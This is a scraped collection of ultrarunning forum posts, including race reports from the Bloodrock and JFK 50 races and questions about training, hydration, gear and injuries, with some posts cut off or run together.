I started taking Tylenol, my wife got icy-hot and would roll me when we met, but it was getting worse and worse. I was running with a race friend and he was having his own issues. The last 15 miles I would have to stop every few minutes, get on my knees and press my head to the ground to get a few minutes of relief just to be able to walk. If I simply lifted my wrist to look at my watch it would start the process of pain all over.

Our times were seriously slipping and we started realizing no way we can keep this up for another 15 hours. 

He wanted to get 100K in and we did. Then we called it

### Post-race

So after the quiet ride back to the rental, we got in around 4am, a shower and sleep here is what worked and didn't.

Training seemed to work well, hydration, nutrition no issues. Stomach felt great. I usually don't feel like eating after 40 miles, but just smiled and ate, knowing I had too. 

Gear was good, I would not change anything. I think I had everything covered. I even bought a super small charger to charge my watch in my vest jacket. 

Crew was off the charts great! I mean they made sure I had anything I needed and more. They even picked up Rockeys pizza!!!

Besides the back issue, I felt great, just minor aches and pains. I was not tired, etc. 

The issue, the back!!!  

I still have zero idea what happened or why. I did 2 28 mile runs and 1 30 under even more hilly terrain and it never happened before! I run on the same surface during training. So I'm at a loss.

I have an appointment with a PT who is runner friendly and is good, so hopefully she has an answer for me.

Bottom line; I'm a bit bummed I didn't do the full 100, felt I could have if not for the back and OK with the 100K, I've only ever done the JFK 50, so that was a win.

Thanks for reading nd if you all have any questions or suggestions about what's up with my back, let me know.

Last thing; It was a great race. Dave K. the RD is fantastic, the AS volunteers are super heroes,  the course and weather were excellent. Heck I'm signed up for 2022 already!

## Training
I went into this race with about 3-4 months of devoted training. My biggest training month was October, with 186 miles and 15k feet elevation. November had a bit of a wrench thrown into the training plan due to unexpected family circumstances, which prevented me from training for about 10 days. Not ideal, but I rolled with the punches. I took about a 2 week taper, focusing on keeping myself moving with a lot of walks with the dog, but not as many runs. I did 1 tempo/threshold run a few days out, which was more or less an accident but I needed it for the mental break (the pre-race taper blues is a real thing for me). 

Some more aspects of training that I found were extremely helpful:
* Food training. I found that apple and sweet potato baby food pouches were extremely easy to swallow during my training runs. This along with Science in Sport gels soon were established as my main food. 
* Hill training. I chose to practice running on extremely steep and technical hills. I run with Black Diamond Distance Carbon Z poles, which would prove to be extraordinarily helpful on the course. 
* Time on feet: My 3 biggest activities during training were  (1) 22 trail miles, 7 hour, 6k feet elev (for time on feet), (2) 21 trail miles, 3500 feet climbing, 14min/mi avg pace (stayed in Z2 almost the entire time), and (3) a 20 road mile tempo run (7:59 avg).
 * Recovery weeks: Every 2.5-3.5 weeks I would cut back my mileage and focus on very easy miles for the week, in order to let my body recover. 

## Race Day

An overview of the race course: There were 4 race distances this weekend, a 25k, a 55k, a 50 miler, and a 100 miler. The 25k was the north loop, the 55k was the north and south loop, the 50 miler was the north loop, south loop, then north loop again, and the 100 miler was the 55k course 3 times. Course map is available [here](https://www.southeasterntrailruns.com/uploads/1/0/5/2/105203083/published/2021-bloodrock-11-12-map.jpg?1636810724). 

### Pre-race:
Stayed at a hotel outside of the park the night before. I got no more than about 4 hours of sleep. Woke up around 3am and went over my nutrition and clothing plan for the 74th time while waiting to leave for the race. Got there around 0600 for an 0700 kickoff time.

### Section 1: Mile 0 - Mile 12.8/15.1(ish)? [AKA, first North loop]
Went out a little bit hot. Knocked out some faster miles on the road and service roads on the way to NTH, sticking with Harrison (another runner who I had met at the preview run 2 weeks prior) for a few miles. Ended up dropping her after starting some of the initial climbs. Dropped into the backcountry and experienced the extraordinarily difficult Barkley/Topless climbs. Somewhere in here, I joined a group of 2 guys: one non-descript guy who's name I don't remember, and one guy wearing a Let's Go Brandon t-shirt (those of you who know me well know that I am awful with names and therefore I remember almost nobody's names). From here on out, this group is LGB+Co. because I can't think of anything better. Cruised through Eagles Nest AS at 9.8 miles, grabbing some ginger ale and cheese quesadillas, and topping off my vest bladder with more tailwind. Felt solid coming back in on my first lap with a time of 3:40ish. My watch said 12.8 miles, course map said 15.1, and LGB+Co said 13.4 and 16.2. No one actually knew what mile it was. For the purposes of this race report, that was mile 15.1. We topped up on nutrition, more tailwind, and started the climb out of Cabins for the south loop.

### Section 2: Mile 15.1-35 [AKA, Terrace/Peavine or South loop]
This section was still feeling solid. Definitely more runnable than the North loop for the majority of the course. Some service roads and easy trails were a blessing to be able to stretch the legs out some and jog. After a nice long drop, I ended up at Terrace AS around mile 20.5. Terrace was a beautiful aid station in a big field. Changed out my shirt and socks, re-lubed everything, and popped a few salt tablets to help counteract some of the sweating that the jogging had started. LGB had started dealing with some IT band issues, so we took a few minutes at this AS while he tried to get his IT band worked out. Took a few minutes longer than I was hoping, but we had similar time goals in mind so I tried to stick with them. Right before I headed out, I had a small shot of some Wild Turkey to calm the nerves.

After leaving Terrace, LGB continued to slow, and I ended up dropping them on one of the road sections through the neighborhood. After a particularly brutal technical descent then climb into Peavine, I was dealing with some not-too-hot mental fatigue. Took a few minutes here to get myself collected, and get my nutrition plan back on track. Shoutout to the AS for having pot stickers as one of the food options available, those got me picked up again. Another sock change here because I had plenty of pairs ready, and I had a really comfortable set of socks planned out at the 34 mile mark. Got myself rehydrated, and grabbed my headlight because I'd be rolling into the next AS (Cabins/mi 34) about 20-30 minutes after sunset. Also switched out the lens on my sunglasses for my clear lenses. Headed out from the AS right as LGB+Co got in. That was the last I saw them in the race. If you are a careful reader, you'll see something I did at every other aid station that I forgot to do here ;-)

After about a mile, I went to go drink a bit more tailwind, and realized I had forgotten to top back up on my vest bladder. Some profanities were exclaimed. I estimated how much I had left at around a liter and ensured that I took the next 8 miles relatively gently to prevent myself from losing too much more fluid. I continued to go through gels to keep the electrolytes up. The monotonous trek across the ridgeline for several miles was not particularly helpful for the mental state, so I played some spotify on my phone to keep me going. I took 1-2 breaks when I saw comfy looking rocks and decided to sit and stretch out for a bit. Around a half mile out from the cabins AS, I heard the beautiful sound of cowbell, and picked up the pace again. Got into the cabins around 1700, around 10 hours into the race. My average pace had dropped by that point, down to around 17 minute miles. I learned at this point that a good number of people had dropped at the 55K mark, due to the sheer difficulty of the course. I had told myself coming into this race that I would drop for any physical injury, dehydration, or delirium. I had been dealing with some hot spots on my heels for an hour or so, which prompted a stop by the medic tent to see if he could work any magic. After an alcohol/iodine rinse over the heels, and a sock change, I felt better. He said that the rinse wouldn't fix the hotspots, but would buy me a few more miles before they got unbearable. I estimated that I had between 5 and 7 hours to go at this point. I also heard through the grapevine that there was a 2 hour extension on the original 18 hour cutoff time. My mental state had picked back up, and after filling up with more tailwind, ginger ale, and quesadillas, I was ready to go out for the last section.

### Section 3: Mile 35-50 [A repeat of North Loop]
I had made sure to pay careful attention to the North loop the first time I ran it in the daylight, as well as the information I had gleaned from it during the preview run 2 weeks prior. I knew that the two major climbs were Barkley (short, steep, but not terrible if you put your head down and go), and then Topless hill (a hill that's mentally debilitating... 3 false peaks, and once you get to the top of the ridge, you keep dropping back down and climbing back up for the next while). I caught up to Harrison again on one of the initial climbs, and stuck with that group as I had heard reports of some wolf/coyote packs howling, and I figured that a group would be safer, as well as good for the mental state. Lots of chatting and conversation ensued as we endured the PUDS (pointless ups and downs) that we had to look forward to. I was better at climbing, Harrison was better at descending, which meant that we ended up averaging around the same pace. We came across one of the 100M runners on Barkley, who we stuck with for a bit but soon left in the distance. As I neared the top of the hill, I felt a searing pain on the skin on my left heel. I knew something had happened with the hotspot, and it was too painful to even put that heel on the ground. I decided I couldn't do anything about it anyway so I resolved to not do anything about it until I got to the finish line. Once we got to Topless, I got another wind of energy and proceeded to power up the hill, leaving the group behind me. I took every hill one step at a time. My heel had gone numb, and at this point in the race, I was not feeling any pain anymore. I felt like I was floating across the ground. I rolled through Eagle's Nest again, chugged some ginger ale and ate some cheese, and pushed myself for the final descent and the last few miles. At this point I gave up on trying to eat, as even the though of food was nauseating. The descent out of Eagle's Nest was probably the most brutal descent of my life. My quads were completely shot, and every descending step was more and more difficult. I watched the numbers on my altimeter drop... I started around 1100 and knew the bottom was somewhere around 650-700. The only saving grace was knowing once I hit the bottom of this climb, I was home free. I heard some cowbell (thanks to my amazing crew) at the bottom of the hill, so I knew I was almost there. I finally hit the bottom, took a second to collect myself and check my mileage, and jogged out the last 2 miles. I see the finish line, and jog through it as my watch reads 16 hours and 4 minutes, 11,000 feet of climbing, and 45.8 miles (GPS was rather wonky through some sections).

### Post Race:
The first thing I did was take a shot of Jagermeister to numb the feeling of sheer exhaustion. I stopped by the medic tent again and had him take a look at my heel. Turns out the pain was from the blister forming, and there wasn't much he could do about it, so I went on my way. Crew helped me pack up and we left for the hotel. I laid on the floor with my legs elevated for a bit, ate a bit of food, and passed out.

Don Choi inducted into the American Ultrarunning Hall of Fame,"Don Choi, a long-time postman 📬 from San Francisco, has been inducted into the American Ultrarunning Hall of Fame as its 20th member. Don is recognized as being “the father of the modern multi-day race.” He made a significant historic contribution to the sport of ultrarunning by bringing back the multi-day races after an absence of 75 years. He organized the first modern six-day race in 1980 at Woodside, California. As a pioneer ultrarunner, he set nearly all the initial modern-day ultra records over 100 miles and won more than 30 early American ultras. In 1984, he was the first American to surpass 500 miles in six days, since 1903. During the 1980s he participated in 21 six-day races, more than anyone in the world, and won nine of them.

Anyone ever use a Ultra Belt 5.0 Hydration Waistpack for biking?,"Planning a trip where I will be taking my Ultimate Direction Ultra Belt 5.0 Hydration Waistpack for trail running.  I also hope to rent a bike for several rides, and thought I'd use my waist belt for that.  Wondering if anyone has actually done this, or used something similar, and how well it worked.  I have this nagging feeling that, what sounds good right now, might go wrong when first put in to practice, or not ;-)

As a twist, I could also use an Ultra Vest instead, if others have found that works, at least Kinda.

50k with No Aid Stations…,"I’m seeking general thoughts and advice here. I have a flat 50k this weekend and I want to try running through the aid stations while carrying all the liquid I need in my Hyrdropak vest 1.5L. (Gonna use a bottle of honey/syrup for food)

This is purely an experiment and I am using this race as a training run for a 100miler I have in February so not worried about l “optimal performance” or gunning for a PR.

Background:
-PR for a similar course was 4hours 50min
-I’ve done 10 50ks prior to this so the distance isn’t new

Do you think a 1.5L camel back of water mixed with electrolyte powder will be enough for 5 hours? Could I get away with a 2L? What’s the amount of water you guys and gals typically use during a flat, cold temperature, 50k?

Just ran my first ultra!,"Posting because I want to say a massive THANK YOU to everyone here that gave me advice. I ran my very first 50K and it was AMAZING. I thought I would give back by sharing a bit about my experience for anyone else that might find it helpful or inspirational in some way.

Previously, the farthest I had ever run was 24 miles. (I had done a handful of 30+ mile hikes in the past and some pretty high-mileage backpacking trips.)

I was more of a rock climber than a runner for many years, and would run 1-2 miles on the treadmill a few times a week as part of a regular gym routine. A friend convinced me to sign up for my first 5K in 2019, and I upped the gym mileage to practice running 3 miles which at the time seemed huge! After that, another friend convinced me to sign up for a 25K with her that fall. It sounded absolutely crazy and impossible, but I thought it might be fun to work towards a goal and see what I was capable of. I did it, and at the time it was a MASSIVE achievement for me.

Then of course lockdown happened, and I got into Strava challenges. I decided I would try to get the monthly half marathon badge every month, just as a fun personal goal. I did a handful of other half marathon and 25K events, and after one particularly enjoyable one (and a few beers) I decided to register for a 50K, and that felt ABSOLUTELY INSANE. I truly did not believe I was capable. I figured it would give me something to look forward to and train for. And if I was lucky, I could finish, crawling my way through the finish line.

I did not have a formal training plan. I made up my plan based on what I know about my own body, advice from a few friends that had ran ultras before, and this sub. I had a sporadic baseline of 5-30mpw for all of 2020 and 2021 before I started ramping up training. I did 5 weeks of \~30mpw, then from advice on this sub, upped it to 40-50mpw for 4 weeks (Week 2 I blew it and went past 50, and this was the first time I felt like absolute garbage and like running was miserable. I made it a point not to pass 50 anymore.) Two weeks before the race I dropped to 30-40mpw (honestly, this was tough, I wanted to do more and ended at 39.5), and the last week I did only 10 miles leading up to the race (This was really hard. I was in the habit of running twice a day and found it really tough to stay put.)

As part of the training block, I did a 25K race (I signed up for a 25K that was 3 weeks before the 50K, and a half marathon 8 weeks before, with the idea that this would force me to do these long runs even if I was having a tough time training) and it was AWFUL. It was the same course I had done in 2019, and I think I just got in my head about how much stronger I am now than I was then, and how I needed to beat my old time. I didn't beat my time. I worked my ass off out there and finished two whole minutes slower, and had an absolutely miserable time, cried a few times on course, tripped and fell, and threw up at the end. During that race I REALLY considered dropping out of the 50K. I felt like I had ABSOLUTELY no business running an ultra. If I was this miserable running a 25K, who did I think I was signing up for a 50K? It was a bad time and I was pretty devastated.

I had only one long run planned after that, a 20mi run that covered a lot of the same course as the 50K. It was... OK. It was a lot better than the 25K race, and I made a point to run very relaxed and keep my heart rate relatively low. Run slow. Don't get excited. By mile 16 I was starting to feel bad and was in a lot of pain for the last few miles. After this my thinking was that I MIGHT be ABLE to do the 50K... but it would be absolutely the hardest and most miserable thing I had ever done. And I needed to prepare myself for the reality that it might take me every possible allowed minute, and it might take absolutely everything that I had.

My strategy for the race was to just stay as casual as possible. I wore my favorite old shoes and old clothes. I didn't have an estimate for how long I would take, or a goal time. My only goal was to finish and have enough energy and spirits left to celebrate afterwards. I was expecting to have an absolutely miserable time, and I just wanted to try and enjoy it as much as I could. I even packed tissues in my drop bag so I would be able sit down and have a good cry at mile 22.

I ran with a friend and had casual chit chat with him and other runners for the first 13 miles. At that point we decided to split up and he ran off ahead. I just enjoyed the scenery and tried to look at my watch as little as possible. I took my time at the aid stations and more than anything tried to stay casual. Just another beautiful day out for a nice run. At about mile 20 I could tell my mood was starting to drop, so I put my headphones on for some music motivation. The course started to turn downhill and I started feeling really good. I even started passing some people, which shocked me. Of course that good feeling didn't last, and by mile 24 I started the ""constantly checking how much farther I have to go"" phase of the day. Just 3 miles to the next aid station, then just 4 miles to the end.

The piece of advice that came to me in that moment was one I read here on this sub: When it hurts to run, it also hurts to walk, but if you keep running, you will be done hurting sooner. I just kept running. It hurt but I somehow wasn't upset about it.

Around the time I rolled in to the mile 27 aid station, I started getting emotional. This was the farthest I had ever run in my life. I had just completed my first marathon. There wasn't that much farther. I could do it. It was really going to happen. It was really happening.

During that final stretch, I kept thinking about my younger self. Teenage me, skipping gym class, laughing in the face of anyone who might suggest I participate in any kind of exercise. Even 2.5 years ago me, terrified of that first morning I stayed on the treadmill for 3 whole miles. Anything is possible. I could feel myself on the edge of tears, finally allowing myself to run ""fast"" for that last 5K. Anything is possible.

I am not a fast runner. I am not a natural runner or a natural athlete. I have no idea what I am doing. But I did it. I picked a goal that seemed terrifyingly impossible, and I gave it everything I could. And I absolutely blew away my expectations. And somehow, beyond any dream, I loved it.

I can't wait to see what happens next.",ultrarunning,1638821720

First 50k Training Question?," I just signed up for my first 50k in March (hilly/trail) and I am working on a training plan 14 weeks out from the race.

dexamethasone for iontophoresis,"Any docs or PT's or people that have done this before out there, my PT recommended this to me today, and I just wanted to get a second opinion (before I get a third from my doc). A bit of backstory

1. Have had issues on the left leg before (sprained ankle, calf tightness, patellar tendonitis at different times the past 5 years)
2. I ran a 100 miler 9 weeks ago, and tried to double back for a marathon 3 weeks later. I didn't make the start line, but the past 9 weeks I've been running 0-20mi/week without the pain going away completely
3. Currently the problem is patellar tendonitis, but it has moved to the bursae occasionally
4. In that time I've been seeing my PT to correct an imbalance of the left quad being weaker than the right
5. Still can't seem to shake it off, so today he recommended this treatment

I certainly trust my PT, he focuses on runners, and his in-law who he has crewed for several times is an ultra runner. Also my doc is a runner as well. From what I can tell this won't heal the issue, but will buy a month or so to work on it pain-free. That being said, I don't want to get any dependence on cortisone, rather than fix the underlying issue. Am I overthinking it, or does anyone have experience with this treatment?

100 mile pacing question,"Hey all, I'm about to sign up for my first 100-mile race, which will be a double out-and-back on a semi-hilly (14k' vert) course.

I felt great until mile 45, but the last five miles got pretty rough and I finished with very little left in the tank. 

My primary goal for the 100 is simply to finish, because it'll be the first time I've raced anything over 50 miles. But that said, does anyone have suggestions for pacing, assuming I'm able to train appropriately between now and then?

(3:44 with 2,000ft gain) Did a level 2 Matt Fitzgerald plan with mileage up to 50, running with one day off every three weeks. Anyways, I have my eye on a 50k on Feb 12. I’m completely rested up, without any nagging injuries.  

Do you in the ultra world think this is an okay idea? The appeal of an ultra is not caring about pace, and just enjoying myself in woods. Looks like it’s 11 weeks out….",ultrarunning,1638150488
Strength training while ultra training,"For the past few years, I alternate lifting and running (each 3x/week) and take one rest/walk/yoga day.

I’m about to start a six-month training program for a 50-mile ultra that will have me running five days/week instead of three. 

I plan to reduce my lifting to two days/week, once on a no-run day and another on the lightest run day. 

My full-body lifting routine changes every three weeks from low rep/high weight, 8-12 reps, and high reps/low weight/hypertrophy.

As expected, the 50-miler plan has my weekly mileage will gradually climbing from my current \~25-28 miles/week to 60+.

**What should I do about lifting for legs, e.g., squats, deadlifts, lunges, etc.? Skip them? Modify?**

I fear my legs will already be tired from the increased volume and lifting legs will overdo it.

If it matters, my 50-miler will be on a rail trail, so no huge verticals.

I’d appreciate any wisdom and experience y’all can offer.",ultrarunning,1638146067

Belts for Belt Buckle,"My girlfriend is running her first 50 very soon and the prize for finishing will be a western style belt buckle (as is tradition among your people). While I have no problem finding men's sized belts with changeable buckles, I keep getting buried in Google searches with ""women's western style fashion belts."" 

Obviously, I'm not so sadistic or insensitive to give this to her before the race, but I think it would be fun for her to have the option while she's still basking in the glow of her achievement. I figure if she doesn't finish this time, I can tuck it in my closet for when she does. (Also, if I'm breaking any race taboos, please let me know! She's already preparing a list of things that are good to say to her and things that are not: ie, ""you're moving well!""- good vs ""you're looking good!""-bad, etc)

One week out from my first ultra and struggling to wrap my mind around how I’ll finish it.,"Hey everyone, my first ultra is on Saturday (50 mi) and I’m wondering if it’s normal to feel unprepared at this point. From what I’ve been told from others with ultra experience, my plan was solid. Here’s what I did (Saturday was always my long run and on a trail, the other days were on the road):

However, I still don’t feel all that confident for whatever reason (perhaps this is normal). My 25+ mile runs always hurt (primarily my feet, which felt destroyed) and when I finished, I felt as if I only had a few miles left in me (definitely not another 20). Even yesterday when I finished my 10 mile run, it was hard to imagine doing that four more times. Is this normal? Will this final week of tapering really help *that* much?",ultrarunning,1638106171

## Training

My initial plan for the spring was to run both the Chicago Marathon and JFK 50. My talents and future in the sport absolutely lies in ultras, but I haven’t quite yet given up on the road marathon. However, after talking with my coach, we both agreed that the 6 week turnaround from Chicago to JFK (while doable) was less than ideal. My rationale was that trying to race both at full effort would lead to a subpar performance for both – I would rather really nail 1 race than run 2 I hit at 90%.  Since the 2024 Marathon Trials Standards aren’t out, I didn’t want to waste my fall on an all out marathon effort. So, JFK 50 became the “A” target of the fall with Chicago remaining on the schedule as a hard tune-up workout effort. My entry in to the world of ultra marathoning had been pretty rosy - the #4 American performer ever at 50 miles in the fall of 2020 to breaking a 30 year old, highly respected Strolling Jim 40 course record in the Spring on 2021. Both were solo time-trial experiences, so I wanted a race that offered the competition for me to really measure myself against the best in the sport.

The theme of this training cycle was trying (and failing) to recapture the magic I found last year when training for Tunnel Hill 50. During that cycle, I was crushing 3 long runs a week and seemed to be ascending to ever higher planes of fitness. This cycle included a job change + move - Lexington, KY to Boston for a job with New Balance - and a persistent grumpy left achilles. Both were just enough to keep me firing on what I felt was 90% capacity. Objectively, workouts went well, but I never really got into the groove of training like I did last fall.

I ran Chicago at workout effort as planned and had a blast running [2:24 for 25th place](https://www.instagram.com/p/CVEeIoMsjKZ/) in less-than-ideal conditions. From there, I focused on recovery and nailing the last 6 weeks of training before JFK. The most notable change I made this cycle was to include several trail + road combo long runs to get used to dumping my trail legs off after 90 minutes and shifting to efficient road running. The most notable of these was in Littleton, NH with 10+ miles on singletrack straight into 22 on a flat rail trail. These runs helped, but there’s only so much you can do to prepare for the mix of hilly trail, flat tow path, and rolling roads that JFK throws at you.

You can see my full training on strava [here](https://www.strava.com/athletes/17080027).

## JFK Background

It’s helpful to have a little background on JFK. It’s the largest and oldest ultramarathon in the country with this being the 59th year of the race. The field is always very competitive and the course has some tremendous history. Names on the all-time list are instantly recognizable for fans of the sport. I wanted to run the race not only to finally dip my toes into the nationally competitive ultra world, but also run a race on a course that would allow me to compare my effort against the titans of the sport.

The course itself is very diverse and after over a half century has taken on a life of its own unique to the event. It’s not a trail race and it’s not entirely a road race, so both road and trail specialists can’t fall back on their strengths. It takes an all-around good runner to compete well at the race. The official course description is below:

*The first 5.5 miles (starting on road surface and joining the Appalachian Trail at 2.5 miles) gains 1,172 feet in elevation. The course from 2.5 to 15.5 miles is on the Appalachian Trail (except for two miles of paved road between 3.5 and 5.5 miles). This section of the AT is very rocky in sections as it rolls across the mountain ridge. At approximately 14.5 miles the course drops over 1,000 feet in a series of steep “switchbacks” that then crosses under Rt. 340 and connects with the C&amp;O Canal towpath. The “Canal” section of the JFK 50 Mile is 26.3 miles (from 15.5-41.8 miles) of almost totally flat unpaved dirt/gravel surface that is free of all automotive vehicle traffic. The JFK 50 Mile route leaves the C&amp;O Canal towpath at Dam #4 and proceeds to follow gently rolling paved country roads the last 8.4 miles to the finish. The Boonsboro start is at an elevation of 570 feet. The Williamsport finish is at 452 feet above sea level.*

## Race

The race itself went off 6:30 AM. Hoka runner Adam Peterman and I jumped out front to an immediate lead on the road. I focused on running easy and keeping close tabs on my effort as we climbed the 500+ feet on the road to the AT. Adam and I chatted a bit the first few miles and I could immediately tell he’s a super nice guy. We had a few mutual connections in the sport and talked a bit about the race itself. We hit mile 1 in 6:19 and Adam remarked “only 49 to go!”

As we began to climb more and more and approached the start of the trail section, I felt Adam’s pace begin to inch a little faster than I was comfortable running so early in the race. While I was tempted to ignore reason and try to run with him, I knew the smart thing to do was back off and run my own race. I hit the start of the trail section 11 seconds back of Adam and watched as he scampered off into the woods. I continued to catch glimpses of him at various points until about 5 miles in. I told myself to focus on my race and to not think too far beyond just getting through this first 15+ mile trail section of the race with my legs still feeling fresh and in-tact.

Things remained pretty unremarkable until mile 6 when an unmarked turn through me for a loop. I was 80% sure that the right fork was correct, so I turned and ran about 50 meters down the trail. Suddenly, though, I was paralyzed by indecision and fear of taking a wrong turn. I stopped and ran back to the intersection for another look. Still seeing no indication of which way was correct (other than a gut feeling of how the trail looked), I yelled out hoping some volunteer down one of the trails would respond and provide some evidence my decision was right. When no one called back, I just went with my gut and ran down the original trail I had chosen, losing somewhere between 60-90 seconds.

I had no idea if I was still on course until a mile later when I came across a hiker and asked “did you see another runner up ahead?” She replied “Oh yeah…he’s a ways up there. Better hurry up!” Other than being slightly entertained by the unsolicited annotation of the race, I was relieved that Adam and I were at least on the same trail. I still wasn’t fully convinced I was on course until course volunteers appeared another mile later. I thanked them for being out there and let myself relax that I had indeed stayed on course. “Now just focus on getting to the other side of this trail feeling good and whole.”

The 10 mile aid station was a burst of energy that was a welcome change from the silence of the woods. I blew through it and headed back up another climb. At the top I had a long line of sight of the aid station area and caught a glimpse of the pack of 3-4 guys chasing me. I took note of the gap and tried to not let it change how I was attacking the trail. So far, I felt good and within myself. I was determined to not let the knowledge that there was a 1-2 minute gap back to the next pack be a catalyst to do something stupid like run too hard up the next climb.

I kept this mindset the next 5 miles as the trail slowly descended and finally hit “the drop” from the ridge down to the C&amp;O Canal. On the switchbacks I finally had another long enough line of sight to catch a glimpse of the pack chasing me down from the ridge. I took note of the gap but immediately turned back inward and focused on getting off the mountain without falling or destroying my quads.

After a tricky descent, I finally burst out of the trail and onto the road to a line of cheering spectators and crew. It was a nice welcome off the trail and I enjoyed the run down to the C&amp;O canal to meet my crew for the first time. We had rehearsed my shoe/vest swap the night before. The shoe plan was to swap from the New Balance Fresh Foam More Trail to the RC Elite 2, while the vest plan was to swap my vest for an entirely new one with fresh nutrition so that I didn’t have to mess with refilling bottles. I ran to my crew, ripped my vest off and threw myself into the chair. [My boyfriend helped get my trail shoes off](https://www.instagram.com/p/CWgspR-LWft/) while I was tying the RC Elite on the other foot. I was told Adam had a 7 minute lead. This was the first specific time feedback I had gotten the whole race, and I was honestly a little shocked the gap was already 7 minutes. I was hopeful I could make up some time on the C&amp;O canal. My legs still felt pretty good and I’ve always been solid at running \~6 minute pace deep into an ultra.

The rest of my crew helped get my fresh vest on and gloves back to me as I peeled out of the aid station. I later found out the whole transition was done in 45 seconds - a 10 second improvement from the dress rehearsal the night before! I focused on trying to dump off my trail legs and get in the groove I wanted to hold for the  next marathon of the race. “Just find the flow.” I started to find a little of it, but the really fluid state I usually find was frustratingly elusive. My achilles started to hurt and got worse and worse for about a mile. It finally started to subside and mostly went away, but I still couldn’t find the flow I wanted.

I passed an aid station and unexpectedly saw my crew again at 19 miles for some cheers. I waved and blew through, trying to not let on that I wasn’t exactly thriving. Robbie, a teammate from college there crewing was a few steps past the aid station and told me I was about 7 minutes back. I was a little frustrated that despite having just run 5 or so 6 flat/sub 6 miles, I was still losing ground. I knew then that Adam was probably not coming back, and the best thing to do was to focus on running the canal as well as I could.

I still couldn’t find any flow, but things at least didn’t feel hard at mile 20. That began to change at mile 22 when I began to feel the fatigue start to creep in. Suddenly, the enormity of what I had left began to seep into my mind. I started to wonder why, of all the things to do in the big wide world, I had chosen to make ultras my “thing.” I shut that toxic train of thought down and kept telling myself that I had gotten through these races before. It was going to be hard, but I knew this was something I could do. I set my sights on mile 28 when I’d see my crew again next.

At 28, we had a quick vest swap and another update that Adam was about 10 minutes ahead. I briefly hit a solid groove around 30 miles and for a moment felt like myself. A biker going the opposite direction gave me some love and said “you look stronger than that guy up ahead.” I latched on to the first and only bit of news I had heard so far that indicated Adam was indeed human and showing cracks. For a few blissful minutes, I actually felt like myself and felt like I may be able to squeeze something more out of the last 20 miles of the race. As soon as it came, though, the feeling left and I was once again confronting the 2ish hours of running I had left.

I made a deal with myself to just focus on getting to an hour left. With under an hour to go, I knew I’d be able to muscle my way to the finish. If I could just get to that mark, things would be ok…

My last crew stop was at mile 38. I was hurting and they knew it, but the vest swap went smoothly and cheered me on as I headed off on the last leg of the journey. The remaining 4 miles of the C&amp;O canal agonizingly ticked by, and suddenly I finally found myself on the road. The change in surface was an immediate mood booster. The shockingly steep hill at mile 42 was an immediate mood killer. I got halfway up, saw it turned yet another corner, and decided to just walk the hill. I was genuinely afraid I wouldn’t be able to finish the race if I ran up the rest of the way.

When the hill finally topped out, I reluctantly began running again and was pleasantly surprised at how my legs were responding to being on pavement. I knew Adam was long gone ahead of me, but I was worried about 3rd place running me down the last 8 miles. Nutrition wasn’t going down as well, but I knew I needed to keep the flow of calories going. I stopped for 5 seconds at each of the last 3 aid stations of the race and threw back a cup of Coke at each. The new source of calories seemed to hit my system in a way that Gu no longer was able to. Each time I put down a little coke, I had a few minutes of improved running.

Over the last 3 miles, I kept checking behind me for a glimpse of 3rd but never saw anyone. All I wanted to do was walk, but I dutifully trudged forward, each mile slowly ticking by. I finally approached the finish line and laughed at how cruel it was that they gave you such a long finishing stretch for 50 miles. I crossed in 5:35:44 and [have never been more happy to be done with a race](https://www.instagram.com/p/CWhRKNoMD9r/). My crew enveloped me and made sure I knew I had just run the 7th fastest time in JFK history. Adam had run an incredible 5:19 for the second fastest time in the history of the race, just barely missing the course record. I hung around as the next few people came in, and it became apparent that this was one of the deepest and fastest years ever at JFK. On the podium, we learned it was the fastest top 10 in history.

## Final Thoughts

The longer I am in this sport, the more I begin to consider what it is that I want to ultimately get out of it. Pushing your limits as a runner to be the best version of yourself is noble, but at some point I will find where that line is. Eventually, the years of training and racing will be boiled down to a few stats of what I was able to accomplish in the sport. I want an impressive resume and to give everything I can while I am able, but at the end of the day, I don’t think that’s why I still do this after 15+ years of competitive running.

What I want more than anything out of this journey is war stories and memories and adventures with people I love. Every time I hear someone like Andy Jones-Wilkins talk about their running career on a podcast, I’m floored at how easily story after incredible story flows. I’m impressed with what someone like Andy was able to accomplish in terms of results, but I’m even more inspired by the way these people were able to use these experiences as a tool for a life well lived. While I have some big goals I want to accomplish in the coming years, I’m making sure to first and foremost enjoy the journey I’m on and be thankful that I’m surrounded by people I love. Because one day, I won’t really care that I finished 2nd at the JFK 50…but you better bet I’ll still be telling the story of a 45 second shoe change over a glass of bourbon with old friends.

80k/50 mile per week runners with busy lives- what does you schedule look like?,"I am doing around 65km per week at the moment and looking to build over the next few weeks. However, I am also trying to generally follow sensible training rules to avoid injury and/or burnout including: 

* 80% of running at easy pace- for me at the moment that's around 6:00/km. However, where I run is quite hilly, so that also slows me down somewhat if I try to keep HR/RPE properly low.
* Recovery running only after a long or hard session- recovery running being even slower than 'easy'
* Walking/slow jog warm-up and cool down when doing harder running
* A long run of a maximum of 3 hours as a general rule
* a rest day at least once a week, and when fatigued

As on most week days I only have a maximum of between 45 minutes-1.5 hours free time for running I am finding it tough to see how I can build to higher volumes while still following the above.

Sprained ankle recovery time,"Hi all, long time runner doing \~50-60 miles/week (5, 6x week). Nearly seven weeks ago I sprained my ankle descending a local trail. After realising I could put some pressure on it, I hobbled/ran the last 15 minutes home. It swelled, but not massively, and I had no bruising. Within a week I was walking pretty much fine. After two weeks I tried a couple of short run/walks and it was just OK. The swelling was going down, but still present. I eventually decided to see a physiotherapist after about three weeks who more or less said I just needed some more time and I'd be OK. 

Fast-forward to now, coming up to seven weeks and there is still some minor swelling around the front/lateral side of the ankle, and though for all intents and purposes it's OK day-to-day, I still know doing classic knee-to-wall tests and comparing to my other ankle, it's still lagging. I haven't run much more than 6mile/50 minutes and only a couple of times / week as I'm still unsure of it. What're other people's experiences been?

Through lots of glute strengthening exercises and stretching, I was able to run the whole 50 miles without experiencing any IT band pain. My cousin (26), dad (54) and uncle (62) all successfully crossed the finish line.

When will vert training pay off?,"I’m looking at running my first ultra in the spring or summer of 2022, and hoping I’ve built a big enough base to get me there. 

I’ve been running 40-50 MPW since April 2020, all miles on trails. Since April of this year, I’ve been heavily focused on vert, and am at about 275,000 ft of elevation gain in 2021 so far (over 2100 miles ran). My average weekly vert is 6,000-8,000 ft. I honestly prefer running uphills over flats or even downhills so this has been fun for me 😅 

